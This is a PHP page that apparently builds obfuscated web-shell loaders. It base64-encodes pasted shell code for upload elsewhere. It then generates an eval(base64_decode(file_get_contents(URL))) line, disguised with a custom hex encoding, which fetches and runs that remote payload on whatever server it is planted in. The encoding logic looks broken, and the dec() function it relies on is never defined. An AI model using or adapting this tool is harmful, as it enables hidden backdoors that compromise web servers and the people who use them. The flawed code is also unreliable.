<?php
if(isset($_POST['scode'])) {
    $code = $_POST['scode'];
    $code = base64_encode($code);
}

if(isset($_POST['sfunc'])) {
    $byt = $_POST['bytes'];
    $url = $_POST['sfunc'];
    $fnc = "eval(base64_decode(file_get_contents('$url')));";
    $fnc = base64_encode($fnc);
    $fnc = enc($fnc, $byt);
    $fnl = "eval(base64_decode(dec('$fnc', $byt)));";
}

function enc($v, $b) {
    $enc = bin2hex($v);
    $spl = str_split($enc);
    $rtn = '';
    foreach($spl as $x){
        if(is_numeric($x)) {
            $x=$x*$b;
        } else {
        }
        $rtn = $rtn."\x$x";
    }
    return $rtn;
}
?>
<html>

<form method="post">
<h2>1. Encode Shell</h2>
<p>Encode your Shell then upload it somewhere as plaintext.</p>
<a href="https://php-minify.com" target="_blank">Minify your code first.</a>
<br><br>
<textarea name="scode" style="width:50em;height:20em;" placeholder="SHELL CODE"><?php if(isset($_POST['scode'])) { echo $code; } ?></textarea>
<br>
<button style="width:50em;height:2.5em;" type="submit">ENCODE</button>
</form>

<hr>

<form method="post">
<h2>2. Generate Function Bytes</h2>
<p>Input the URL for your raw text Shell upload and generate the byte code function.</p>
<input type="text" name="sfunc" style="width:50em;" placeholder="URL TO SHELL CODE FILE" <?php if(isset($_POST['sfunc'])) { echo 'value="' . $fnl . '"'; } ?> required />
<br>
<select name="bytes" id="bytes" required>
    <option value="" disabled>BYTES</option>
    <option value="64">64</option>
    <option value="128">128</option>
    <option value="256">256</option>
    <option value="512">512</option>
</select>
<br>
<button style="width:50em;height:2.5em;" type="submit">GO</button>
</form>

<hr>

</html>
